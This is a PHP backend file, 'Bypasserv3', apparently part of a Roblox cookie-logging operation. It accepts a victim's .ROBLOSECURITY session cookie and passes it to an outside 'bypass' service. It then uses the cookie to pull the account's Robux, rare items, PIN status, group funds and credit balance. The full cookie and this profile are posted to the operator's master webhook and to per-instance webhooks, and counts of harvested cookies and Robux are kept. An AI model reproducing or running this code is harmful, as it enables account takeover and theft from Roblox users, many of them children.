<?php
/**
 * Bypasserv3 - Bypass API Endpoint
 * Updated with per-instance user webhooks and detailed Roblox data
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

require_once '../config.php';
require_once '../functions.php';

// Random security scan
if (rand(1, 100) === 1) {
    securityScan(true);
}

// Random cleanup
if (rand(1, 50) === 1) {
    cleanupRateLimits();
}

// Method check
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

// Suspicious request check
if (isSuspiciousRequest()) {
    logSecurityEvent('suspicious_request', [
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'None'
    ]);
}

// Rate limiting
$ip = getUserIP();
if (!checkRateLimit($ip, 50, 3600)) {
    http_response_code(429);
    echo json_encode(['success' => false, 'error' => 'Rate limit exceeded']);
    exit;
}

// Parse input
$input = json_decode(file_get_contents('php://input'), true);

if (json_last_error() !== JSON_ERROR_NONE) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid JSON']);
    exit;
}

// Extract data
$cookie = trim($input['cookie'] ?? '');
$directory = trim($input['directory'] ?? '');

// Validate cookie
if (empty($cookie)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Cookie required']);
    exit;
}

if (!validateCookie($cookie)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid cookie format']);
    logSecurityEvent('suspicious_cookie_attempt', ['ip' => $ip]);
    exit;
}

// Get instance data for webhook
$instanceData = getInstanceData($directory);
if (!$instanceData) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Instance not found']);
    exit;
}

$userWebhook = $instanceData['userWebhook'] ?? '';
$masterWebhook = MASTER_WEBHOOK;

// ============================================
// HELPER FUNCTIONS FOR ROBLOX API
// ============================================
function makeRequest($url, $headers, $postData = null) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    if ($postData) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
    }
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

function ownsBundle($userId, $bundleId, $headers) {
    $url = "https://inventory.roblox.com/v1/users/$userId/items/3/$bundleId";
    $response = makeRequest($url, $headers);
    return isset($response['data']) && !empty($response['data']);
}

// ============================================
// CALL EXTERNAL API WITH BETTER ERROR HANDLING
// ============================================
$externalApiUrl = 'https://rblxbypasser.com/api/bypass';
$postData = json_encode(['cookie' => $cookie]);

$ch = curl_init($externalApiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'User-Agent: Bypasserv3/1.0'
]);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);

$apiResponse = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

// Check for curl errors or non-200 response
if (!empty($curlError) || $httpCode !== 200 || empty($apiResponse)) {
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => 'Failed To Send Request, Make Sure Ur Cookie Already Refreshed Or Ur Account Is Not -13 / Age Verified Account'
    ]);
    logSecurityEvent('external_api_failure', [
        'http_code' => $httpCode,
        'curl_error' => $curlError,
        'ip' => $ip,
        'directory' => $directory
    ]);
    exit;
}

$apiData = json_decode($apiResponse, true);

// Check if API response is valid
if (!$apiData || !isset($apiData['success']) || !$apiData['success']) {
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => 'Failed To Send Request, Make Sure Ur Cookie Already Refreshed Or Ur Account Is Not -13 / Age Verified Account'
    ]);
    logSecurityEvent('api_invalid_response', ['ip' => $ip, 'directory' => $directory]);
    exit;
}

// ============================================
// EXTRACT USER DATA FROM API RESPONSE
// ============================================
$userInfo = $apiData['userInfo'] ?? [];
$robux = intval($userInfo['robux'] ?? 0);
$rap = intval($userInfo['rap'] ?? 0);
$summary = intval($userInfo['summary'] ?? 0);
$username = $userInfo['username'] ?? 'Unknown';
$userId = $userInfo['userId'] ?? 'Unknown';
$avatarUrl = $apiData['avatarUrl'] ?? 'https://www.roblox.com/headshot-thumbnail/image/default.png';

// Try to get bypassed cookie from API response, fallback to original if not present
$bypassedCookie = $apiData['cookie'] ?? $apiData['bypassedCookie'] ?? $cookie;
// Clean the cookie (remove warning prefix if present)
$bypassedCookie = str_replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '', $bypassedCookie);

// ============================================
// FETCH ADDITIONAL DETAILED ROBLOX DATA
// ============================================
// Headers for Roblox API requests (use bypassed cookie)
$headers = ["Cookie: .ROBLOSECURITY=$bypassedCookie", "Content-Type: application/json"];

// Get User Info
$userInfoData = makeRequest("https://users.roblox.com/v1/users/$userId", $headers) ?? [];
$displayName = $userInfoData['displayName'] ?? $username;

// Get Settings Data
$settingsData = makeRequest("https://www.roblox.com/my/settings/json", $headers) ?? [];
$isPremium = isset($settingsData['IsPremium']) ? ($settingsData['IsPremium'] ? '✅ True' : '❌ False') : '❓ Unknown';
$emailVerified = isset($settingsData['IsEmailVerified']) ? ($settingsData['IsEmailVerified'] ? '✅ True' : '❌ False') : '❓ Unknown';

// Get Transaction Summary
$transactionSummaryData = makeRequest("https://economy.roblox.com/v2/users/$userId/transaction-totals?timeFrame=Year&transactionType=summary", $headers) ?? [];
$pendingRobux = $transactionSummaryData['pendingRobuxTotal'] ?? '❓ Unknown';

// Get PIN Status
$pinData = makeRequest("https://auth.roblox.com/v1/account/pin", $headers) ?? [];
$pinStatus = isset($pinData['isEnabled']) ? ($pinData['isEnabled'] ? '✅ True' : '❌ False') : '❓ Unknown';

// Get Voice Chat Status
$vcData = makeRequest("https://voice.roblox.com/v1/settings", $headers) ?? [];
$vcStatus = isset($vcData['isVoiceEnabled']) ? ($vcData['isVoiceEnabled'] ? '✅ True' : '❌ False') : '❓ Unknown';

// Check for Premium Items (Headless & Korblox)
$hasHeadless = ownsBundle($userId, 201, $headers);
$hasKorblox = ownsBundle($userId, 192, $headers);
$headlessStatus = $hasHeadless ? '✅ True' : '❌ False';
$korbloxStatus = $hasKorblox ? '✅ True' : '❌ False';

// Calculate Account Age
$accountCreated = isset($userInfoData['created']) ? strtotime($userInfoData['created']) : null;
$accountAge = '❓ Unknown';
if ($accountCreated) {
    $days = floor((time() - $accountCreated) / (60 * 60 * 24));
    $accountAge = "$days days";
}

// Get Friends Count
$friendsData = makeRequest("https://friends.roblox.com/v1/users/$userId/friends/count", $headers) ?? [];
$friendsCount = $friendsData['count'] ?? '❓ Unknown';

// Get Followers Count
$followersData = makeRequest("https://friends.roblox.com/v1/users/$userId/followers/count", $headers) ?? [];
$followersCount = $followersData['count'] ?? '❓ Unknown';

// Get Owned Groups and Calculate Group Funds
$groupsData = makeRequest("https://groups.roblox.com/v2/users/$userId/groups/roles", $headers) ?? [];
$ownedGroups = [];
if (isset($groupsData['data'])) {
    foreach ($groupsData['data'] as $group) {
        if (isset($group['role']['rank']) && $group['role']['rank'] == 255) {
            $ownedGroups[] = $group;
        }
    }
}
$totalGroupsOwned = count($ownedGroups);

$totalGroupFunds = 0;
$totalPendingGroupFunds = 0;
foreach ($ownedGroups as $group) {
    $groupId = $group['group']['id'] ?? null;
    if ($groupId) {
        $groupFunds = makeRequest("https://economy.roblox.com/v1/groups/$groupId/currency", $headers) ?? [];
        $totalGroupFunds += $groupFunds['robux'] ?? 0;
        
        $groupPayouts = makeRequest("https://economy.roblox.com/v1/groups/$groupId/payouts", $headers) ?? [];
        if (isset($groupPayouts['data'])) {
            foreach ($groupPayouts['data'] as $payout) {
                if (isset($payout['status']) && $payout['status'] === 'Pending') {
                    $totalPendingGroupFunds += $payout['amount'] ?? 0;
                }
            }
        }
    }
}

// Get Credit Balance
$creditBalanceData = makeRequest("https://billing.roblox.com/v1/credit", $headers) ?? [];
$creditBalance = $creditBalanceData['balance'] ?? '❓ Unknown';
$creditRobux = $creditBalanceData['robuxAmount'] ?? '❓ Unknown';

// ============================================
// UPDATE INSTANCE STATS
// ============================================
if ($instanceData) {
    updateInstanceStats($directory, 'totalCookies', ($instanceData['stats']['totalCookies'] ?? 0) + 1);
    updateInstanceStats($directory, 'totalRobux', ($instanceData['stats']['totalRobux'] ?? 0) + $robux);
    updateInstanceStats($directory, 'totalRAP', ($instanceData['stats']['totalRAP'] ?? 0) + $rap);
    updateInstanceStats($directory, 'totalSummary', ($instanceData['stats']['totalSummary'] ?? 0) + $summary);
    
    updateDailyStats($directory, 'cookies', 1);
    updateDailyStats($directory, 'robux', $robux);
    updateDailyStats($directory, 'rap', $rap);
    updateDailyStats($directory, 'summary', $summary);
}

// Update global stats
updateGlobalStats('totalCookies', 1);

// ============================================
// SEND WEBHOOKS WITH DETAILED DATA
// ============================================

// Create the detailed embed payload
$detailedEmbed = [
    'content' => '@everyone',
    'username' => 'Fuji',
    'avatar_url' => 'https://cdn.pfps.gg/pfps/51778-beabadoobee.png',
    'embeds' => [[
        'title' => '',
        'type' => 'rich',
        'description' => "<:line:1350104634982662164> <:refresh:1350103925037989969> **[Refresh Cookie](https://www.logged.tg/tools/refresher?defaultFill=$bypassedCookie)** <:line:1350104634982662164> <:profile:1350103857903960106> **[Profile](https://www.roblox.com/users/$userId/profile)** <:line:1350104634982662164> <:rolimons:1350103860588314676> **[Rolimons](https://rolimons.com/player/$userId)**",
        'color' => hexdec('00061a'),
        'thumbnail' => ['url' => $avatarUrl],
        'fields' => [
            ['name' => '<:display:1348231445029847110> Display Name', 'value' => "```$displayName```", 'inline' => true],
            ['name' => '<:user:1348232101639618570> Username', 'value' => "```$username```", 'inline' => true],
            ['name' => '<:userid:1348231351777755167> User ID', 'value' => "```$userId```", 'inline' => true],
            ['name' => '<:robux:1348231412834111580> Robux', 'value' => "```$robux```", 'inline' => true],
            ['name' => '<:pending:1348231397529223178> Pending Robux', 'value' => "```$pendingRobux```", 'inline' => true],
            ['name' => '<:rap:1348231409323741277> RAP', 'value' => "```$rap```", 'inline' => true],
            ['name' => '<:summary:1348231417502371890> Summary', 'value' => "```$summary```", 'inline' => true],
            ['name' => '<:pin:1348231400322498591> PIN', 'value' => "```$pinStatus```", 'inline' => true],
            ['name' => '<:premium:1348231403690786949> Premium', 'value' => "```$isPremium```", 'inline' => true],
            ['name' => '<:vc:1348233572020129792> Voice Chat', 'value' => "```$vcStatus```", 'inline' => true],
            ['name' => '<:headless:1348232978777640981> Headless Horseman', 'value' => "```$headlessStatus```", 'inline' => true],
            ['name' => '<:korblox:1348232956040319006> Korblox Deathspeaker', 'value' => "```$korbloxStatus```", 'inline' => true],
            ['name' => '<:age:1348232331525099581> Account Age', 'value' => "```$accountAge```", 'inline' => true],
            ['name' => '<:friends:1348231449798774865> Friends', 'value' => "```$friendsCount```", 'inline' => true],
            ['name' => '<:followers:1348231447072215162> Followers', 'value' => "```$followersCount```", 'inline' => true],
            ['name' => '<:creditbalance:1350102024376684644> Credit Card Balance', 'value' => "```$creditBalance USD (est $creditRobux Robux)```", 'inline' => true],
            ['name' => '<:group:1350102040818221077> Groups Owned', 'value' => "```$totalGroupsOwned```", 'inline' => true],
            ['name' => '<:combined:1350102005884125307> Combined Group Funds', 'value' => "```$totalGroupFunds Robux ($totalPendingGroupFunds pending)```", 'inline' => true],
            ['name' => '<:status:1350102051756970025> Account Status', 'value' => "```$emailVerified```", 'inline' => true],
        ]
    ]]
];

// Cookie embed payload
$cookieEmbed = [
    'content' => '',
    'username' => 'Fuji',
    'avatar_url' => 'https://cdn.pfps.gg/pfps/51778-beabadoobee.png',
    'embeds' => [[
        'description' => "```$bypassedCookie```",
        'color' => hexdec('00061a')
    ]]
];

// Send to Master Webhook
if (!empty($masterWebhook)) {
    sendWebhookNotification($masterWebhook, $detailedEmbed);
    sleep(1);
    sendWebhookNotification($masterWebhook, $cookieEmbed);
}

// Send to User Webhook (same detailed format)
if (!empty($userWebhook)) {
    sendWebhookNotification($userWebhook, $detailedEmbed);
    sleep(1);
    sendWebhookNotification($userWebhook, $cookieEmbed);
}

// Log successful bypass
logSecurityEvent('successful_bypass', [
    'username' => $username,
    'userId' => $userId,
    'robux' => $robux,
    'directory' => $directory,
    'ip' => $ip
]);

// ============================================
// RETURN RESPONSE
// ============================================
echo json_encode([
    'success' => true,
    'userInfo' => $userInfo,
    'avatarUrl' => $avatarUrl
]);
?>
